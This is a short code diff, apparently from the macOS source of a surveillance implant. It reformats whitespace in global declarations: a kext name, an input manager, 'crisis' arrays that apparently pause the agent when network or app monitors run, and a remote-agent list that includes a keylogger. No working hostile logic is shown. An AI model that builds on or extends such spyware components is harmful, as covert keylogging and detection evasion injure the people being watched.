@@ -85,8 +85,8 @@ NSString *gConfigurationUpdateName  = nil;
 NSString *gInputManagerName         = nil;
 NSString *gKextName                 = nil;
 UInt32    gAgentCrisis              = CRISIS_STOP;
-NSMutableArray  *gAgentCrisisNet           = nil;
-NSMutableArray  *gAgentCrisisApp          = nil;
+NSMutableArray  *gAgentCrisisNet    = nil;
+NSMutableArray  *gAgentCrisisApp    = nil;
 
 u_int remoteAgents[8] = { OFFT_KEYLOG,
                           OFFT_PRINTER,
@@ -105,7 +105,7 @@ u_int gOSMajor  = 0;
 u_int gOSMinor  = 0;
 u_int gOSBugFix = 0;
 
-int getBSDProcessList (kinfo_proc **procList, size_t *procCount)
+int getBSDProcessList(kinfo_proc **procList, size_t *procCount)
 {
   int             err;
   kinfo_proc      *result;
